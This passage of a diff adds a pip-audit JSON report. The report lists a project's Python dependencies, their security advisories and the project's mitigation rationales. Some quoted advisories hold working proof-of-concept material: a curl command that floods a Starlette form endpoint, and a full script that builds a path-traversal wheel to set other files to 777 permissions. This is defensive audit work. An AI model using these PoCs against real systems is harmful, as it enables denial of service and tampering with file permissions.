+          "description": "When extracting a tar archive pip may not check symbolic links point into the extraction directory if the tarfile module doesn't implement PEP 706. Note that upgrading pip to a \"fixed\" version for this vulnerability doesn't fix all known vulnerabilities that are remediated by using a Python version that implements PEP 706. Note that this is a vulnerability in pip's fallback implementation of tar extraction for Python versions that don't implement PEP 706 and therefore are not secure to all vulnerabilities in the Python 'tarfile' module. If you're using a Python version that implements PEP 706 then pip doesn't use the \"vulnerable\" fallback code. Mitigations include upgrading to a version of pip that includes the fix, upgrading to a Python version that implements PEP 706 (Python >=3.9.17, >=3.10.12, >=3.11.4, or >=3.12), applying the linked patch, or inspecting source distributions (sdists) before installation as is already a best-practice.",
+          "fix_versions": [
+            "25.3"
+          ],
+          "id": "GHSA-4xh5-x5gv-qwph"
+        },
+        {
+          "aliases": [
+            "CVE-2026-1703"
+          ],
+          "description": "When pip is installing and extracting a maliciously crafted wheel archive, files may be extracted outside the installation directory. The path traversal is limited to prefixes of the installation directory, thus isn't able to inject or overwrite executable files in typical situations.",
+          "fix_versions": [
+            "26.0"
+          ],
+          "id": "GHSA-6vgw-5pg2-w6jp"
+        },
+        {
+          "aliases": [
+            "CVE-2026-3219"
+          ],
+          "description": "pip handles concatenated tar and ZIP files as ZIP files regardless of filename or whether a file is both a tar and ZIP file. This behavior could result in confusing installation behavior, such as installing \"incorrect\" files according to the filename of the archive. New behavior only proceeds with installation if the file identifies uniquely as a ZIP or tar archive, not as both.",
+          "fix_versions": [],
+          "id": "GHSA-58qw-9mgm-455v"
+        },
+        {
+          "aliases": [
+            "CVE-2026-6357"
+          ],
+          "description": "pip prior to version 26.1 would run self-update check functionality after installing wheel files which required importing well-known Python modules names. These module imports were intentionally deferred to increase startup time of the pip CLI. The patch changes self-update functionality to run before wheels are installed to prevent newly-installed modules from being imported shortly after the installation of a wheel package. Users should still review package contents prior to installation.",
+          "fix_versions": [
+            "26.1"
+          ],
+          "id": "GHSA-jp4c-xjxw-mgf9"
+        }
+      ]
+    },
+    {
+      "name": "pip-api",
+      "version": "0.0.34",
+      "vulns": []
+    },
+    {
+      "name": "pip-audit",
+      "version": "2.7.3",
+      "vulns": []
+    },
+    {
+      "name": "pip-requirements-parser",
+      "version": "32.0.1",
+      "vulns": []
+    },
+    {
+      "name": "platformdirs",
+      "version": "4.9.6",
+      "vulns": []
+    },
+    {
+      "name": "pluggy",
+      "version": "1.6.0",
+      "vulns": []
+    },
+    {
+      "name": "posthog",
+      "version": "7.14.1",
+      "vulns": []
+    },
+    {
+      "name": "protobuf",
+      "version": "6.33.6",
+      "vulns": []
+    },
+    {
+      "name": "psutil",
+      "version": "7.2.2",
+      "vulns": []
+    },
+    {
+      "name": "py-serializable",
+      "version": "1.1.2",
+      "vulns": []
+    },
+    {
+      "name": "pydantic",
+      "version": "2.7.1",
+      "vulns": []
+    },
+    {
+      "name": "pydantic-core",
+      "version": "2.18.2",
+      "vulns": []
+    },
+    {
+      "name": "pygments",
+      "version": "2.20.0",
+      "vulns": []
+    },
+    {
+      "name": "pyparsing",
+      "version": "3.3.2",
+      "vulns": []
+    },
+    {
+      "name": "pypika",
+      "version": "0.51.1",
+      "vulns": []
+    },
+    {
+      "name": "pyproject-hooks",
+      "version": "1.2.0",
+      "vulns": []
+    },
+    {
+      "name": "pytest",
+      "version": "8.2.0",
+      "vulns": [
+        {
+          "aliases": [
+            "CVE-2025-71176"
+          ],
+          "description": "pytest through 9.0.2 on UNIX relies on directories with the `/tmp/pytest-of-{user}` name pattern, which allows local users to cause a denial of service or possibly gain privileges.",
+          "fix_versions": [
+            "9.0.3"
+          ],
+          "id": "GHSA-6w46-j5rx-g56g"
+        }
+      ]
+    },
+    {
+      "name": "pytest-asyncio",
+      "version": "0.23.7",
+      "vulns": []
+    },
+    {
+      "name": "pytest-cov",
+      "version": "5.0.0",
+      "vulns": []
+    },
+    {
+      "name": "python-dateutil",
+      "version": "2.9.0.post0",
+      "vulns": []
+    },
+    {
+      "name": "python-dotenv",
+      "version": "1.2.2",
+      "vulns": []
+    },
+    {
+      "name": "python-json-logger",
+      "version": "2.0.7",
+      "vulns": []
+    },
+    {
+      "name": "python-multipart",
+      "version": "0.0.28",
+      "vulns": []
+    },
+    {
+      "name": "pyyaml",
+      "version": "6.0.3",
+      "vulns": []
+    },
+    {
+      "name": "pyzmq",
+      "version": "27.1.0",
+      "vulns": []
+    },
+    {
+      "name": "redis",
+      "version": "5.0.4",
+      "vulns": []
+    },
+    {
+      "name": "regex",
+      "version": "2026.5.9",
+      "vulns": []
+    },
+    {
+      "name": "requests",
+      "version": "2.34.0",
+      "vulns": []
+    },
+    {
+      "name": "requests-oauthlib",
+      "version": "2.0.0",
+      "vulns": []
+    },
+    {
+      "name": "requests-toolbelt",
+      "version": "1.0.0",
+      "vulns": []
+    },
+    {
+      "name": "rich",
+      "version": "15.0.0",
+      "vulns": []
+    },
+    {
+      "name": "rich-toolkit",
+      "version": "0.19.8",
+      "vulns": []
+    },
+    {
+      "name": "ruff",
+      "version": "0.4.4",
+      "vulns": []
+    },
+    {
+      "name": "safetensors",
+      "version": "0.7.0",
+      "vulns": []
+    },
+    {
+      "name": "scikit-learn",
+      "version": "1.8.0",
+      "vulns": []
+    },
+    {
+      "name": "scipy",
+      "version": "1.13.0",
+      "vulns": []
+    },
+    {
+      "name": "sentence-transformers",
+      "version": "3.0.0",
+      "vulns": []
+    },
+    {
+      "name": "setuptools",
+      "version": "79.0.1",
+      "vulns": []
+    },
+    {
+      "name": "shellingham",
+      "version": "1.5.4",
+      "vulns": []
+    },
+    {
+      "name": "six",
+      "version": "1.17.0",
+      "vulns": []
+    },
+    {
+      "name": "slack-sdk",
+      "version": "3.27.2",
+      "vulns": []
+    },
+    {
+      "name": "smmap",
+      "version": "5.0.3",
+      "vulns": []
+    },
+    {
+      "name": "sniffio",
+      "version": "1.3.1",
+      "vulns": []
+    },
+    {
+      "name": "sortedcontainers",
+      "version": "2.4.0",
+      "vulns": []
+    },
+    {
+      "name": "starlette",
+      "version": "0.37.2",
+      "vulns": [
+        {
+          "aliases": [
+            "CVE-2024-47874"
+          ],
+          "description": "### Summary Starlette treats `multipart/form-data` parts without a `filename` as text form fields and buffers those in byte strings with no size limit. This allows an attacker to upload arbitrary large form fields and cause Starlette to both slow down significantly due to excessive memory allocations and copy operations, and also consume more and more memory until the server starts swapping and grinds to a halt, or the OS terminates the server process with an OOM error. Uploading multiple such requests in parallel may be enough to render a service practically unusable, even if reasonable request size limits are enforced by a reverse proxy in front of Starlette.  ### PoC  ```python from starlette.applications import Starlette from starlette.routing import Route  async def poc(request):     async with request.form():         pass  app = Starlette(routes=[     Route('/', poc, methods=[\"POST\"]), ]) ```  ```sh curl http://localhost:8000 -F 'big=</dev/urandom' ```  ### Impact This Denial of service (DoS) vulnerability affects all applications built with Starlette (or FastAPI) accepting form requests. ",
+          "fix_versions": [
+            "0.40.0"
+          ],
+          "id": "GHSA-f96h-pmfr-66vw"
+        },
+        {
+          "aliases": [
+            "CVE-2025-54121"
+          ],
+          "description": "### Summary When parsing a multi-part form with large files (greater than the [default max spool size](https://github.com/encode/starlette/blob/fa5355442753f794965ae1af0f87f9fec1b9a3de/starlette/formparsers.py#L126)) `starlette` will block the main thread to roll the file over to disk. This blocks the event thread which means we can't accept new connections.  ### Details Please see this discussion for details: https://github.com/encode/starlette/discussions/2927#discussioncomment-13721403. In summary the following UploadFile code (copied from [here](https://github.com/encode/starlette/blob/fa5355442753f794965ae1af0f87f9fec1b9a3de/starlette/datastructures.py#L436C5-L447C14)) has a minor bug. Instead of just checking for `self._in_memory` we should also check if the additional bytes will cause a rollover.  ```python      @property     def _in_memory(self) -> bool:         # check for SpooledTemporaryFile._rolled         rolled_to_disk = getattr(self.file, \"_rolled\", True)         return not rolled_to_disk      async def write(self, data: bytes) -> None:         if self.size is not None:             self.size += len(data)          if self._in_memory:             self.file.write(data)         else:             await run_in_threadpool(self.file.write, data) ```  I have already created a PR which fixes the problem: https://github.com/encode/starlette/pull/2962   ### PoC See the discussion [here](https://github.com/encode/starlette/discussions/2927#discussioncomment-13721403) for steps on how to reproduce.  ### Impact To be honest, very low and not many users will be impacted. Parsing large forms is already CPU intensive so the additional IO block doesn't slow down `starlette` that much on systems with modern HDDs/SSDs. If someone is running on tape they might see a greater impact.",
+          "fix_versions": [
+            "0.47.2"
+          ],
+          "id": "GHSA-2c2j-9gv5-cj73"
+        }
+      ]
+    },
+    {
+      "name": "sympy",
+      "version": "1.14.0",
+      "vulns": []
+    },
+    {
+      "name": "tenacity",
+      "version": "8.5.0",
+      "vulns": []
+    },
+    {
+      "name": "threadpoolctl",
+      "version": "3.6.0",
+      "vulns": []
+    },
+    {
+      "name": "tokenizers",
+      "version": "0.22.2",
+      "vulns": []
+    },
+    {
+      "name": "toml",
+      "version": "0.10.2",
+      "vulns": []
+    },
+    {
+      "name": "torch",
+      "version": "2.11.0",
+      "vulns": []
+    },
+    {
+      "name": "tqdm",
+      "version": "4.67.3",
+      "vulns": []
+    },
+    {
+      "name": "transformers",
+      "version": "4.57.6",
+      "vulns": [
+        {
+          "aliases": [
+            "CVE-2026-1839"
+          ],
+          "description": "A vulnerability in the HuggingFace Transformers library, specifically in the `Trainer` class, allows for arbitrary code execution. The `_load_rng_state()` method in `src/transformers/trainer.py` at line 3059 calls `torch.load()` without the `weights_only=True` parameter. This issue affects all versions of the library supporting `torch>=2.2` when used with PyTorch versions below 2.6, as the `safe_globals()` context manager provides no protection in these versions. An attacker can exploit this vulnerability by supplying a malicious checkpoint file, such as `rng_state.pth`, which can execute arbitrary code when loaded. The issue is resolved in version v5.0.0rc3.",
+          "fix_versions": [
+            "5.0.0rc3"
+          ],
+          "id": "GHSA-69w3-r845-3855"
+        }
+      ]
+    },
+    {
+      "name": "triton",
+      "version": "3.6.0",
+      "vulns": []
+    },
+    {
+      "name": "typer",
+      "version": "0.25.1",
+      "vulns": []
+    },
+    {
+      "name": "typing-extensions",
+      "version": "4.15.0",
+      "vulns": []
+    },
+    {
+      "name": "ujson",
+      "version": "5.12.1",
+      "vulns": []
+    },
+    {
+      "name": "urllib3",
+      "version": "2.7.0",
+      "vulns": []
+    },
+    {
+      "name": "uuid6",
+      "version": "2024.7.10",
+      "vulns": []
+    },
+    {
+      "name": "uvicorn",
+      "version": "0.29.0",
+      "vulns": []
+    },
+    {
+      "name": "uvloop",
+      "version": "0.22.1",
+      "vulns": []
+    },
+    {
+      "name": "watchfiles",
+      "version": "1.1.1",
+      "vulns": []
+    },
+    {
+      "name": "webencodings",
+      "version": "0.5.1",
+      "vulns": []
+    },
+    {
+      "name": "websocket-client",
+      "version": "1.9.0",
+      "vulns": []
+    },
+    {
+      "name": "websockets",
+      "version": "16.0",
+      "vulns": []
+    },
+    {
+      "name": "werkzeug",
+      "version": "3.1.8",
+      "vulns": []
+    },
+    {
+      "name": "wheel",
+      "version": "0.45.1",
+      "vulns": [
+        {
+          "aliases": [
+            "CVE-2026-24049"
+          ],
+          "description": "### Summary  - **Vulnerability Type:** Path Traversal (CWE-22) leading to Arbitrary File Permission Modification.    - **Root Cause Component:** wheel.cli.unpack.unpack function.    - **Affected Packages:**      1. wheel (Upstream source)      2. setuptools (Downstream, vendors wheel)    - **Severity:** High (Allows modifying system file permissions).    ### Details   The vulnerability exists in how the unpack function handles file permissions after extraction. The code blindly trusts the filename from the archive header for the chmod operation, even though the extraction process itself might have sanitized the path.   ``` # Vulnerable Code Snippet (present in both wheel and setuptools/_vendor/wheel) for zinfo in wf.filelist:     wf.extract(zinfo, destination)  # (1) Extraction is handled safely by zipfile      # (2) VULNERABILITY:     # The 'permissions' are applied to a path constructed using the UNSANITIZED 'zinfo.filename'.     # If zinfo.filename contains \"../\", this targets files outside the destination.     permissions = zinfo.external_attr >> 16 & 0o777     destination.joinpath(zinfo.filename).chmod(permissions) ```    ### PoC   I have confirmed this exploit works against the unpack function imported from setuptools._vendor.wheel.cli.unpack.    **Prerequisites:** pip install setuptools    **Step 1: Generate the Malicious Wheel (gen_poc.py)**   This script creates a wheel that passes internal hash validation but contains a directory traversal payload in the file list.   ``` import zipfile import hashlib import base64 import os  def urlsafe_b64encode(data):     \"\"\"     Helper function to encode data using URL-safe Base64 without padding.     Required by the Wheel file format specification.     \"\"\"     return base64.urlsafe_b64encode(data).rstrip(b'=').decode('ascii')  def get_hash_and_size(data_bytes):     \"\"\"     Calculates SHA-256 hash and size of the data.     These values are required to construct a valid 'RECORD' file,     which is used by the 'wheel' library to verify integrity.     \"\"\"     digest = hashlib.sha256(data_bytes).digest()     hash_str = \"sha256=\" + urlsafe_b64encode(digest)     return hash_str, str(len(data_bytes))  def create_evil_wheel_v4(filename=\"evil-1.0-py3-none-any.whl\"):     print(f\"[Generator V4] Creating 'Authenticated' Malicious Wheel: {filename}\")      # 1. Prepare Standard Metadata Content     # These are minimal required contents to make the wheel look legitimate.     wheel_content = b\"Wheel-Version: 1.0\\nGenerator: bdist_wheel (0.37.1)\\nRoot-Is-Purelib: true\\nTag: py3-none-any\\n\"     metadata_content = b\"Metadata-Version: 2.1\\nName: evil\\nVersion: 1.0\\nSummary: PoC Package\\n\"         # 2. Define Malicious Payload (Path Traversal)     # The content doesn't matter, but the path does.     payload_content = b\"PWNED by Path Traversal\"      # [ATTACK VECTOR]: Target a file OUTSIDE the extraction directory using '../'     # The vulnerability allows 'chmod' to affect this path directly.     malicious_path = \"../../poc_target.txt\"      # 3. Calculate Hashes for Integrity Check Bypass     # The 'wheel' library verifies if the file hash matches the RECORD entry.     # To bypass this check, we calculate the correct hash for our malicious file.     wheel_hash, wheel_size = get_hash_and_size(wheel_content)     metadata_hash, metadata_size = get_hash_and_size(metadata_content)     payload_hash, payload_size = get_hash_and_size(payload_content)      # 4. Construct the 'RECORD' File     # The RECORD file lists all files in the wheel with their hashes.     # CRITICAL: We explicitly register the malicious path ('../../poc_target.txt') here.     # This tricks the 'wheel' library into treating the malicious file as a valid, verified component.     record_lines = [         f\"evil-1.0.dist-info/WHEEL,{wheel_hash},{wheel_size}\",         f\"evil-1.0.dist-info/METADATA,{metadata_hash},{metadata_size}\",         f\"{malicious_path},{payload_hash},{payload_size}\",  # <-- Authenticating the malicious path         \"evil-1.0.dist-info/RECORD,,\"     ]     record_content = \"\\n\".join(record_lines).encode('utf-8')      # 5. Build the Zip File     with zipfile.ZipFile(filename, \"w\") as zf:         # Write standard metadata files         zf.writestr(\"evil-1.0.dist-info/WHEEL\", wheel_content)         zf.writestr(\"evil-1.0.dist-info/METADATA\", metadata_content)         zf.writestr(\"evil-1.0.dist-info/RECORD\", record_content)          # [EXPLOIT CORE]: Manually craft ZipInfo for the malicious file         # We need to set specific permission bits to trigger the vulnerability.         zinfo = zipfile.ZipInfo(malicious_path)                 # Set external attributes to 0o777 (rwxrwxrwx)         # Upper 16 bits: File type (0o100000 = Regular File)         # Lower 16 bits: Permissions (0o777 = World Writable)         # The vulnerable 'unpack' function will blindly apply this '777' to the system file.         zinfo.external_attr = (0o100000 | 0o777) << 16                 zf.writestr(zinfo, payload_content)      print(\"[Generator V4] Done. Malicious file added to RECORD and validation checks should pass.\")  if __name__ == \"__main__\":     create_evil_wheel_v4() ```    **Step 2: Run the Exploit (exploit.py)**   ``` from pathlib import Path import sys  # Demonstrating impact on setuptools try:     from setuptools._vendor.wheel.cli.unpack import unpack     print(\"[*] Loaded unpack from setuptools\") except ImportError:     from wheel.cli.unpack import unpack     print(\"[*] Loaded unpack from wheel\")  # 1. Setup Target (Read-Only system file simulation) target = Path(\"poc_target.txt\") target.write_text(\"SENSITIVE CONFIG\") target.chmod(0o400) # Read-only print(f\"[*] Initial Perms: {oct(target.stat().st_mode)[-3:]}\")  # 2. Run Vulnerable Unpack # The wheel contains \"../../poc_target.txt\". # unpack() will extract safely, BUT chmod() will hit the actual target file. try:     unpack(\"evil-1.0-py3-none-any.whl\", \"unpack_dest\") except Exception as e:     print(f\"[!] Ignored expected extraction error: {e}\")  # 3. Check Result final_perms = oct(target.stat().st_mode)[-3:] print(f\"[*] Final Perms: {final_perms}\")  if final_perms == \"777\":     print(\"VULNERABILITY CONFIRMED: Target file is now world-writable (777)!\") else:     print(\"[-] Attack failed.\") ```    **result:**   <img width=\"806\" height=\"838\" alt=\"image\" src=\"https://github.com/user-attachments/assets/f750eb3b-36ea-445c-b7f4-15c14eb188db\" />      ### Impact   Attackers can craft a malicious wheel file that, when unpacked, changes the permissions of critical system files (e.g., /etc/passwd, SSH keys, config files) to 777. This allows for Privilege Escalation or arbitrary code execution by modifying now-writable scripts.    ### Recommended Fix   The unpack function must not use zinfo.filename for post-extraction operations. It should use the sanitized path returned by wf.extract().    ### Suggested Patch:   ``` # extract() returns the actual path where the file was written extracted_path = wf.extract(zinfo, destination)  # Only apply chmod if a file was actually written if extracted_path:     permissions = zinfo.external_attr >> 16 & 0o777     Path(extracted_path).chmod(permissions) ```",
+          "fix_versions": [
+            "0.46.2"
+          ],
+          "id": "GHSA-8rrh-rw8j-w5fx"
+        }
+      ]
+    },
+    {
+      "name": "wrapt",
+      "version": "2.1.2",
+      "vulns": []
+    },
+    {
+      "name": "zipp",
+      "version": "3.23.1",
+      "vulns": []
+    },
+    {
+      "name": "zope-event",
+      "version": "6.2",
+      "vulns": []
+    },
+    {
+      "name": "zope-interface",
+      "version": "8.4",
+      "vulns": []
+    }
+  ],
+  "fixes": [],
+  "sha_mitigation_comments": [
+    {
+      "id": "GHSA-rpm5-65cw-6hj4",
+      "package": "gitpython",
+      "rationale": "The MVP uses GitPython only against the mounted local repository for commit correlation; user-controlled upload_pack/receive_pack options are not accepted. Upgrade to gitpython>=3.1.50 during the next dependency refresh.",
+      "severity": "high"
+    },
+    {
+      "id": "GHSA-x2qx-6953-8485",
+      "package": "gitpython",
+      "rationale": "No untrusted clone or multi_options input is exposed in the demo workflow. Commit correlation reads recent local commits only. Upgrade to gitpython>=3.1.50 during the next dependency refresh.",
+      "severity": "high"
+    },
+    {
+      "id": "GHSA-v87r-6q3f-2j67",
+      "package": "gitpython",
+      "rationale": "The application does not write attacker-controlled Git config values. The demo injector sets only static local author defaults when missing. Upgrade to gitpython>=3.1.50 during the next dependency refresh.",
+      "severity": "high"
+    },
+    {
+      "id": "GHSA-mv93-w799-cj2w",
+      "package": "gitpython",
+      "rationale": "The application does not pass untrusted section or option names to GitPython config writers. Upgrade to gitpython>=3.1.50 during the next dependency refresh.",
+      "severity": "high"
+    },
+    {
+      "id": "GHSA-c67j-w6g6-q2cm",
+      "package": "langchain-core",
+      "rationale": "The MVP RAG path embeds local runbook text and does not deserialize attacker-controlled LangChain objects or arbitrary dictionaries. Upgrade LangChain packages together after compatibility testing with Chroma and the existing plan pins.",
+      "severity": "critical"
+    },
+    {
+      "id": "GHSA-pjwx-r37v-7724",
+      "package": "langchain-core",
+      "rationale": "The MVP does not load serialized LangChain run inputs or outputs from untrusted sources. RAG context is built from the repository runbook only. Upgrade LangChain packages together after compatibility testing.",
+      "severity": "high"
+    },
+    {
+      "id": "GHSA-8rrh-rw8j-w5fx",
+      "package": "wheel",
+      "rationale": "Runtime code does not call wheel unpack or install untrusted wheel artifacts; dependencies are installed during Docker build from pinned requirements. Upgrade wheel>=0.46.2 in the next base image/dependency refresh.",
+      "severity": "high"
+    }
+  ],
+  "sha_security_summary": {
+    "critical_count": 1,
+    "high_count": 6,
+    "severity_source": "OSV CVSS v3 vectors queried on 2026-05-12 for pip-audit GHSA findings"
+  }
+}
